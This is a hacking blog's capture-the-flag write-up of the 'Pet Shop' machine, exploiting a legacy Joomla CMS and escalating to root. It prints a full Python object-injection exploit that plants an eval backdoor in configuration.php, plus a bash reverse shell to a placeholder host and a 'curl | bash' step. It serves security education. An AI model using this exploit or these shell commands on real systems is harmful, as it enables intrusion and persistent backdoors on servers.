<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <title>Pet Shop</title><!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v3.9.3" />
<meta property="og:title" content="Pet Shop" />
<meta name="author" content="FmF" />
<meta property="og:locale" content="en_US" />
<link rel="canonical" href="http://localhost:4000/parrotctf-blogger.html" />
<meta property="og:url" content="http://localhost:4000/parrotctf-blogger.html" />
<meta property="og:site_name" content="FmF - Hacking blog ü©ª" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-08-19T00:00:00-06:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Pet Shop" />
<script type="application/ld+json">
{"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/parrotctf-blogger.html"},"author":{"@type":"Person","name":"FmF"},"@type":"BlogPosting","url":"http://localhost:4000/parrotctf-blogger.html","headline":"Pet Shop","dateModified":"2023-08-19T00:00:00-06:00","datePublished":"2023-08-19T00:00:00-06:00","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="FmF - Hacking blog ü©ª" /><link rel="shortcut icon" type="image/x-icon" href="/logo.png" />
  <link rel="stylesheet" href="/assets/css/main.css" />
</head><body a="dark">
    <main class="page-content" aria-label="Content">
      <div class="w">
        <a href="/">../</a><article>
  <p class="post-meta">
    <time datetime="2023-08-19 00:00:00 -0600">2023-08-19</time>
  </p>
  
  <h1>Pet Shop</h1>

  <p><img src="/assets/img/petShop/1.png" width="800" /></p>

<p><a href="https://parrot-ctfs.com/">ü¶ú Parrot CTFs</a> is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios.</p>

<p>This is an easy difficulty machine that exploits a legacy Joomla Content Management System (CMS) and a binary that has SUID permissions to gain root privileges.</p>

<h1 id="content">Content:</h1>

<ul>
  <li><a href="#enumeration-">Enumeration</a></li>
  <li><a href="#easy-way-%EF%B8%8F">Easy way</a></li>
  <li><a href="#not-too-easy-way-%EF%B8%8F">Not too easy way</a></li>
  <li><a href="#privilege-escalation-">Privilege escalation</a></li>
</ul>

<h1 id="enumeration-">Enumeration üîé:</h1>

<p>We start by using <code class="language-plaintext highlighter-rouge">ping</code> to check the TTL of the machine to determine the OS we are dealing with.</p>

<p><img src="/assets/img/petShop/2.png" width="600" /></p>

<p>Based on the TTL value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: <a href="https://ostechnix.com/identify-operating-system-ttl-ping/">Identify OS using TTL value</a>.</p>

<p>Now, let‚Äôs go with an nmap scan to view the open ports.</p>

<p><code class="language-plaintext highlighter-rouge">sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.65 -oN allPorts</code></p>

<p><code class="language-plaintext highlighter-rouge">-p-</code> ‚Äì&gt; We are doing a scan against all 65535 ports to search for open ports.</p>

<p><code class="language-plaintext highlighter-rouge">--open</code> ‚Äì&gt; It will only report open ports.</p>

<p><code class="language-plaintext highlighter-rouge">-sS</code> ‚Äì&gt; It can be performed quickly, scanning thousands of ports per second.</p>

<p><code class="language-plaintext highlighter-rouge">--min-rate 5000</code> ‚Äì&gt; It sets the minimum rate of packets sent per second to 5000.</p>

<p><code class="language-plaintext highlighter-rouge">-n</code> ‚Äì&gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds.</p>

<p><code class="language-plaintext highlighter-rouge">-v</code> ‚Äì&gt; It will be verbose in its output.</p>

<p><code class="language-plaintext highlighter-rouge">-Pn</code> ‚Äì&gt; This option skips the host discovery stage.</p>

<p><code class="language-plaintext highlighter-rouge">-oN</code> ‚Äì&gt; It will save the output in a file called ‚ÄúallPorts‚Äù.</p>

<p>We find out the following open ports:</p>

<p><img src="/assets/img/petShop/3.png" width="600" /></p>

<p>Let‚Äôs take a look at what the page has.</p>

<p><img src="/assets/img/petShop/4.png" width="600" /></p>

<p>We can see some posts and a user joomla who wrote the posts.</p>

<p>Let‚Äôs use <a>Wappalyzer</a> to detect more information about what tecnologies the page is using.</p>

<p><img src="/assets/img/petShop/5.png" width="400" /></p>

<p>We can see that the Content Management System (CMS) is Joomla, what is a for publishing web content like WordPress and others. Now that we know the CMS, we can search for any administration panel and try default creds. Maybe we have luck :), a quick search in Google show us that the directory for the admin panel is <a>/administrator</a>. We can try to view it going to: <code class="language-plaintext highlighter-rouge">http://10.14.0.65/joomla/administrator</code></p>

<p><img src="/assets/img/petShop/6.png" width="400" /></p>

<p>By default, the username is <code class="language-plaintext highlighter-rouge">admin</code> and the password must be defined in the installation progress. We can try login with the user that we find earlier: ‚Äú<code class="language-plaintext highlighter-rouge">joomla:joomla</code>‚Äù but it doesn‚Äôt work, so‚Ä¶ lets put this aside and continue doing other things.</p>

<p>We can use <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla">HackTricks</a> to search for commons ways to enumerate joomla and try to exploit it, first lets try to search the version.</p>

<p><img src="/assets/img/petShop/7.png" width="600" /></p>

<p>Going to the directory <code class="language-plaintext highlighter-rouge">/language/en-GB/en-GB.xml</code> we can see the version of the CMS, now let‚Äôs search for public exploits for this version.</p>

<p><img src="/assets/img/petShop/8.png" width="600" /></p>

<p>We can use <code class="language-plaintext highlighter-rouge">searchsploit</code> to search for exploits and we can find a lot :)</p>

<p>There are various ways to solve the machine, an easy one and a not-too-easy one. Let‚Äôs first look at the easy way.</p>

<p><img src="/assets/img/petShop/9.png" width="600" /></p>

<h1 id="easy-way-Ô∏è">Easy way üõ£Ô∏è:</h1>

<p>Let‚Äôs do more enumeration. We can use <a>wfuzz</a> to do fuzzing in the page.</p>

<p><img src="/assets/img/petShop/10.png" width="600" /></p>

<p>We can inspect these directories one by one. We can find that some of them have directory listing capabilities, but we cannot find any useful information‚Ä¶</p>

<p>Ok mmm‚Ä¶ Let‚Äôs fuzz for file extensions such as backup files: <code class="language-plaintext highlighter-rouge">bak, backup, bck‚Ä¶</code></p>

<p><img src="/assets/img/petShop/11.png" width="600" /></p>

<p>Wow we can see that there is a configuration file configuration.backup. Let‚Äôs view its contents.</p>

<p><img src="/assets/img/petShop/12.png" width="600" /></p>

<p>The output is ugly so let‚Äôs fix it up. Press <code class="language-plaintext highlighter-rouge">ctrl + u</code> to view the source code. This will make the output a lot prettier, and we can see a username and password. :)</p>

<p><img src="/assets/img/petShop/13.png" width="600" /></p>

<p>Now we can login to the machine with the credentials that we found with: <code class="language-plaintext highlighter-rouge">ssh ron@10.14.0.65</code>, and we are in.</p>

<p><img src="/assets/img/petShop/14.png" width="400" /></p>

<p>Now that we are inside the machine you need to do one thing to ensure smooth operation:</p>

<p>-&gt; <code class="language-plaintext highlighter-rouge">export TERM=xterm</code></p>

<p>This will allow us to clean the screen with <code class="language-plaintext highlighter-rouge">ctrl + l</code>.</p>

<h1 id="not-too-easy-way-Ô∏è">Not too easy way üõ£Ô∏è:</h1>

<p>Let‚Äôs go back a bit and look the available exploits.</p>

<p><img src="/assets/img/petShop/8.png" width="600" /></p>

<p>In this case, I am going to use the exploit with the title: <code class="language-plaintext highlighter-rouge">3.4.6 - 'configuration.php' Remote Code Execution</code>. You can find all the technical details <a href="https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/">here</a>.</p>

<p>You can use <code class="language-plaintext highlighter-rouge">searchsploit -x php/webapps/47465.py</code> to inspect the source of the exploit, and if you want to copy it to your local directory, you can use: <code class="language-plaintext highlighter-rouge">searchsploit -m php/webapps/47465.py</code>.</p>

<p>If you execute it, it will tell you that it is not vulnerable. However, in reality, it is vulnerable.</p>

<p><img src="/assets/img/petShop/15.png" width="600" /></p>

<p>This is where things get complicated. You need to modify and test the exploit using Burp Suite. If you want to understand how this really works, view the <a href="https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/">technical details</a>. But to keep this write-up from getting too long, I‚Äôm going to give you my script to exploit it.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/python3

import requests as r, string, random, re, signal, sys
from bs4 import BeautifulSoup

url = "http://10.14.0.65/joomla/"
#PROXS = {"http":"http://127.0.0.1:8080"}
PROXS = {}

def def_handler(sig, num):
	print("\n\nSaliendo...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def random_string(stringLength):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

def get_backdoor_pay(): # This payload will backdoor the the configuration .PHP with an eval on POST request
	function = 'assert'
	template = 's:3:"FmF";O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'
	payload =  'file_put_contents(\'configuration.php\',\'if(isset($_POST[\\\'' + backdoor_param +'\\\'])) eval($_POST[\\\''+backdoor_param+'\\\']);\', FILE_APPEND) || $a=\'http://wtf\';'
	function_len = len(function)
	final = template.replace('PAYLOAD',payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function)))
	return final

def request(url, payload):
	s = r.Session()
	page = s.get(url + 'index.php/login')
	soup = BeautifulSoup(page.content, "html.parser")

	values = soup.find_all("input")

	csrf = values[-1] # Gets the CSRF token value
	ok = re.findall('name="(.*?)"', str(csrf))
	csrf = ok[0]
	url = url + 'index.php/login?task=user.login'

	return_value = values[-2] # Gets the return value
	ok = re.findall('value="(.*?)"', str(return_value))
	return_value = ok[0]

	user_payload = '\\0\\0\\0' * 9
	inj_object = '";'
	inj_object += payload
	inj_object += 's:6:"return";s:102:' # end the object with the 'return' part
	password_payload = 'AAA' + inj_object

	data = {
		'username':user_payload,
		'password':password_payload,
		'return':return_value,
		csrf:'1'
	}

	s.post(url, proxies=PROXS, data=data)

def ping_backdoor(url, param_name):
	while True:
		command = input("[RCE]~&gt; ")
		res = r.post(url + 'configuration.php', data={param_name:'system(\''+ command +'\');'}) # Here is where the magic happens
		print(res.text)

if __name__ == '__main__':
	backdoor_param = random_string(50) ## Generate a unique string for our payload
	payload = get_backdoor_pay()
	print("[+] Backdoor id: " + backdoor_param)
	request(url, payload)
	print("[+] Backdoor is ready, you can enter now...\n")
	ping_backdoor(url, backdoor_param)
</code></pre></div></div>

<p>Now with this, we can execute commands, but this is NOT a full interactive shell yet.</p>

<p><img src="/assets/img/petShop/16.png" width="600" /></p>

<p>To get an interactive shell, there are a lot of ways to do it, but I‚Äôm going to use this one:</p>

<p>Create a file with the name <code class="language-plaintext highlighter-rouge">index.html</code>, with this content:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -i &gt;&amp; /dev/tcp/YOUR_IP_HERE/443 0&gt;&amp;1
</code></pre></div></div>

<p>Now use the command: <code class="language-plaintext highlighter-rouge">sudo python3 -m http.server 80</code> to put a http server where we are sharing our files.</p>

<p>And finally use the command <code class="language-plaintext highlighter-rouge">nc -lvnp 443</code> to listen for our reverse connection from our payload above.</p>

<p>Now execute the command: <code class="language-plaintext highlighter-rouge">curl YOUR_IP_HERE | bash</code> this is going to get the content of the file index.html and interpret the content as a bash command.</p>

<p><img src="/assets/img/petShop/17.png" width="600" /></p>

<p>We can see that we get a shell like <code class="language-plaintext highlighter-rouge">www-data</code> user.</p>

<p>Now that we are inside the machine you need to do various things to ensure smooth operation:</p>

<ol>
  <li>-&gt; <code class="language-plaintext highlighter-rouge">script /dev/null -c bash</code></li>
  <li>-&gt; <code class="language-plaintext highlighter-rouge">ctrl + z</code></li>
  <li>-&gt; <code class="language-plaintext highlighter-rouge">stty raw -echo; fg</code></li>
  <li>-&gt; <code class="language-plaintext highlighter-rouge">reset xterm</code></li>
  <li>-&gt; <code class="language-plaintext highlighter-rouge">export TERM=xterm</code></li>
</ol>

<p>This will allow us to clean the screen with <code class="language-plaintext highlighter-rouge">ctrl + l</code> and if we do <code class="language-plaintext highlighter-rouge">ctrl + c</code> is not going to kill the shell, more info <a href="https://invertebr4do.github.io/tratamiento-de-tty/#">here</a>.</p>

<p><img src="/assets/img/petShop/18.png" width="600" /></p>

<p>We can see the <code class="language-plaintext highlighter-rouge">configuration.backup</code> file so here we can get the creds of the user ron and we can connect through SSH.</p>

<h1 id="privilege-escalation-">Privilege escalation üö©:</h1>

<p>Now that we are inside the machine as the user <code class="language-plaintext highlighter-rouge">ron</code>, we need to enumerate the system to find a way to escalate privileges.</p>

<p>One thing I always check first is <code class="language-plaintext highlighter-rouge">sudo -l</code>. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the <code class="language-plaintext highlighter-rouge">root</code> user.</p>

<p>More info about privilege escalation techniques check <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">here</a>.</p>

<p><img src="/assets/img/petShop/19.png" width="600" /></p>

<p>We can see something interesting, the binary <a>php</a> can be run as the root user.</p>

<p>A quick search in Google tells us that we can escalate privileges with it, search in <a href="https://gtfobins.github.io/gtfobins/php/#suid">GTFOBins</a>.</p>

<p><img src="/assets/img/petShop/20.png" width="600" /></p>

<p>We execute the commands:</p>

<p><img src="/assets/img/petShop/21.png" width="600" /></p>

<p>And now we are root :)</p>

<p>Hope you like it and learn something new :)</p>


</article>
      </div>
    </main>
  </body>
</html>